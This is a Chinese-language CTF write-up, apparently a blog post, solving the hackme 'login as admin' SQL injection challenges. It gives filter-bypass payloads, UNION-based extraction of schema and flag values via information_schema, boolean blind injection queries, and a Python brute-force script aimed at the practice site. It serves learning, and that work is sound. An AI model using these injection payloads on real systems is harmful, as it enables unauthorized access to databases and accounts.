---
title: 菜鸡又来玩注入
---
没错，还是我，我又来了，还是死磕hackme
---
这次的记录，记录一下 login as admin0，1系列
---
（一）login as admin 0:
	查看源码，发现这里加了个过滤，具体如下：
	if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
	代码审计发现，主要是or 1=1 与“‘”被过滤（PS:菜鸡如我怎么可能都发现，过滤单引号真没看出来，这里感谢某位大佬）
	于是乎想到用||代替or，用转义字符代替单引号，同时注释掉密码部分，于是构造如下payload
	admin\' ||1=1#
	于是成功注入，但是~~~~~~进入之后竟然说：you are not admin!
	WHAT！关键时刻还是Google啊，原来表中默认第一位为非admin,于是看下一位，改payload为;
	admin\' ||1=1 limit 1,1#
	密码任意，成功进入拿到flag1
	
注：这里有个问题，同样是构造恒等式，为什么2=2在这里不行，明明没有被过滤，还有源码中已经定义的$_GET['show_source'] === '1'
	为什么不能用来构造，等待大佬解答
	
————————————————————————————————————————————————————————————————————————————————————————我是分隔线！！！

（二）login as admin 0.1:
	同样的源码，不同的在于需要注入数据库找到flag2,关键代码如下：
	SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'",
        $_POST['name'],
        $_POST['password']
	还是自己太弱，刚看到这个就想当然的POST误导了，一直尝试用HACKBAR传参，终以失败告终。换个方法，再输入框注入，成功
	在上一题中，其实admin可以不加，但这里必须加，这里还判断了是否为空的问题，构造如下payload；
	admin\' and 1=2 union select 1,2,3,4 limit 0,1#
	此时返回2，显然2就是我们要的注入点，于是继续套路:
	admin\' and 1=2 union select 1,database(),3,4 limit 0,1#
	此时回显login_as_admin0，这就是数据库名，继续；
	admin\' and 1=2 union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="login_as_admin0" limit 0,1),3,4 limit 0,1#
	得到表名：h1dden_f14g，继续;
	admin\' and 1=2 union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME="h1dden_f14g" limit 0,1),3,4 limit 0,1#
	得到列名:the_f14g,继续；
	admin\' and 1=2 union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4 limit 0,1#
	哈哈，这里就可以得到flag2了
	
————————————————————————————————————————————————————————————————————————————————————————我还是分隔线！！！
	
（三）login as admin 1:
	类似的题目，最大的区别是过滤了空格和1=1;
	if (strstr($strl, ' ') || strstr($strl, '1=1') || strstr($strl, "''") ||
        strstr($strl, 'union select') || strstr($strl, 'select ')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
	那肯定是要找东西替换空格，第一想法是：\0,可惜失败了，这个时候自然得再次向强大的Google寻求帮助，OK，使用/**/完美解决
	下面就开始构造payload了
	admin\'/**/or/**/1<2/**/limit/**/1,1#
	于是轻松拿下第一个flag1
	
————————————————————————————————————————————————————————————————————————————————————————没错，我就是分隔线！！！
	
（四）login as admin 1.2；
	这个题目相对而言就要难很多，测试竟然没有回显，题目提示通过布尔盲注完成，于是开始恶补布尔盲注，总算还是收获了点东西；
	对于这个页面，主要通过登陆成功与否来进行判断。
	根据套路，首先肯定是要判断数据库名。于是第一步判断数据库名的长度，通过构造如下payload判断
	admin\'/**/or/**/length(database())>=20
	如此逐步判断（使用二分法更快捷），显然可以将长度求出，最后得出为15
	于是下一步逐一试出这15个字母，可以通过正则表达式和ASCII，原谅我正则真的看不懂，于是选择ASCII，构造如下：
	admin\'/**/or/**/ascii(substr(database(),i,1))=j/**/limit/**/0,1#
	其中i遍历所有字母，j遍历可能的ASCII码（33-127）
	这里苦逼的我写的py竟然不行，只得手动查找，得到database()="login_as_admin1"
	下面的步骤当然就是找出表名的长度，于是构造：
	admin\'/**/or/**/length(select/**/TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA="login_as_admin1"/**/limit/**/0,1)>=30)/**/limit/**/0,1#
	最后竟然得到了长度为32，这正是要了我的老命了，关键我的py还没用，所以只列出下一步的操作，结果只能自测了@@@
	admin\'/**/or/**/ascii(substr(select/**/TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA="login_as_admin1"/**/limit/**/0,1),i,1)=j/**/limit/**/0,1#
	
	下面附上我那没用的py,希望可以有大佬指点一番：(原因好像是根本没登陆进去，贼奇怪)
	import requests
	result=""
	url="https://hackme.inndy.tw/login1/index.php"
	for i in range(1,16):
		for j in range(33,127):
			user="admin\'/**/or/**/ascii(substr(database(),i,1))=j/**/limit/**/0,1#"
			data={
            "name":user,"password":"1223"
        }
			r=requests.post(url=url,data=data)
			str="You are not admin!"
			if str in r.content.decode():
				result +=chr(j)
				break
	print (result)
	

说明:经指点，发现以上代码存在两个关键问题：
①.对于py来说，编译时会自动进行反编译，所以这里需要将admin后面的斜杠换为双斜杠，以保证转义之后仍剩余一个
②.致命错误，在user中应该将i,j拿出来书写，而不是放在字符串内
	
	
	
	
	
	
	
	
	
	